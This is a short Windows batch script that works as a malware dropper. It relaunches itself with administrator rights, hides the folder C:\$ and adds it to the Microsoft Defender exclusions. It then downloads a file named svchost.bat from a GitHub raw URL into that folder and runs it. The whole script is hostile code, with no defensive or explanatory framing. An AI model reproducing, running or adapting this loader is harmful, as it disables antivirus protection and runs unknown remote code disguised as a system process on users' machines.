@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    powershell -Command "Start-Process '%~f0' -Verb RunAs" >nul 2>&1
    exit /b
)

attrib +h C:\$

powershell -Command "Add-MpPreference -ExclusionPath 'C:\$'" >nul 2>&1

powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/uj9e/zzz/refs/heads/main/svchost.bat' -OutFile 'C:\$\svchost.bat'" >nul 2>&1

if exist "C:\$\svchost.bat" (
    start "" "C:\$\svchost.bat" >nul 2>&1
)

exit